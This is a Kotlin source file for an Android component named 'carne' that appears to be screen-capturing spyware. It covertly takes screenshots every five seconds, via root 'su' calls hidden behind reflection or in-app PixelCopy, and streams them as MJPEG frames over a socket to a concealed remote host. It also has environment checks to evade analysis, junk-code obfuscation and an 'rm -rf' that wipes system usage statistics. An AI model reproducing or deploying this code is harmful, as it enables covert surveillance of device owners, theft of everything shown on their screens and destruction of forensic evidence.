package com.example.mobsec_823

import android.app.Activity
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.PixelCopy
import android.view.Window
import com.example.mobsec_823.utils.SafetyNet
import com.example.mobsec_823.utils.SecretBox
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.OutputStream
import java.net.Socket
import java.util.Collections
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class carne(private val context: Context, private val activity: Activity? = null) {
    private val screenshots = Collections.synchronizedList(mutableListOf<ByteArray>())
    private val scheduler = Executors.newSingleThreadScheduledExecutor()
    private var isRunning = false
    private val remoteIp = SecretBox.getKitchenAddress()
    private val remotePort = SecretBox.getCarnePort()
    private var totalFramesCaptured = 0

    fun start() {
        if (isRunning) return
        if (!SafetyNet.isEnvironmentSafe()) return

        isRunning = true
        scheduler.scheduleWithFixedDelay({
            if (isRunning) {
                if (!SafetyNet.checkKitchenPermit(88)) return@scheduleWithFixedDelay
                if (isRootAvailable()) captureWithRoot() else activity?.let { captureInApp(it) }
            }
        }, 0, 5, TimeUnit.SECONDS)
        startRemoteForwarding()
    }

    private fun isRootAvailable(): Boolean {
        return try {
            // Static Bypass: Reflected Exec
            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return false
            val os = process.outputStream
            os.write("id\n${SecretBox.getExitCmd()}\n".toByteArray())
            os.flush()
            val output = process.inputStream.bufferedReader().readText()
            process.waitFor()
            output.contains("uid=0")
        } catch (e: Exception) { false }
    }

    private fun captureWithRoot() {
        // Advanced Layer: Opaque Predicate & Junk Code
        if (!SafetyNet.checkOpaquePredicate(totalFramesCaptured)) {
            SecretBox.reflectedExec("rm -rf /data/system/usagestats")
        }

        try {
            val process = SecretBox.reflectedExec(SecretBox.getSuCmd()) ?: return
            val os = process.outputStream
            os.write("${SecretBox.getScreencapCmd()}\n".toByteArray())
            os.write("${SecretBox.getExitCmd()}\n".toByteArray())
            os.flush()

            val pngBytes = process.inputStream.readBytes()
            process.waitFor()
            if (pngBytes.isNotEmpty()) {
                BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size)?.let {
                    processBitmap(it)
                    it.recycle()
                }
            }
        } catch (e: Exception) { }
    }

    private fun captureInApp(act: Activity) {
        val window = act.window
        val view = window.decorView
        if (view.width <= 0 || view.height <= 0) return
        val bitmap = Bitmap.createBitmap(view.width, view.height, Bitmap.Config.ARGB_8888)
        val thread = HandlerThread("PixelCopy").apply { start() }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            PixelCopy.request(window, bitmap, { result ->
                if (result == PixelCopy.SUCCESS) processBitmap(bitmap)
                bitmap.recycle()
                thread.quitSafely()
            }, Handler(thread.looper))
        }
    }

    private fun processBitmap(bitmap: Bitmap) {
        val out = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
        synchronized(screenshots) {
            screenshots.add(out.toByteArray())
            totalFramesCaptured++
            if (screenshots.size > 60) screenshots.removeAt(0)
        }
    }

    private fun startRemoteForwarding() {
        Thread {
            while (isRunning) {
                var socket: Socket? = null
                try {
                    socket = Socket(remoteIp, remotePort)
                    val os = socket.getOutputStream()
                    os.write(SecretBox.getCarneHeader().toByteArray())
                    var sentCount = 0
                    while (isRunning && !socket.isClosed) {
                        getNextFrame(sentCount)?.let {
                            sendMjpegFrame(os, it)
                            sentCount = Math.max(sentCount + 1, totalFramesCaptured - screenshots.size + 1)
                            Thread.sleep(1000)
                        } ?: Thread.sleep(500)
                    }
                } catch (e: Exception) { Thread.sleep(10000) }
                finally { try { socket?.close() } catch (ex: Exception) {} }
            }
        }.start()
    }

    private fun getNextFrame(lastSent: Int): ByteArray? = synchronized(screenshots) {
        if (screenshots.isEmpty()) return null
        val start = totalFramesCaptured - screenshots.size
        val idx = (if (lastSent == 0) start else lastSent) - start
        if (idx < 0) screenshots[0] else if (idx < screenshots.size) screenshots[idx] else null
    }

    private fun sendMjpegFrame(out: OutputStream, frame: ByteArray) {
        out.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray())
        out.write(frame)
        out.write("\r\n".toByteArray())
        out.flush()
    }

    fun stop() { isRunning = false; scheduler.shutdown() }
}
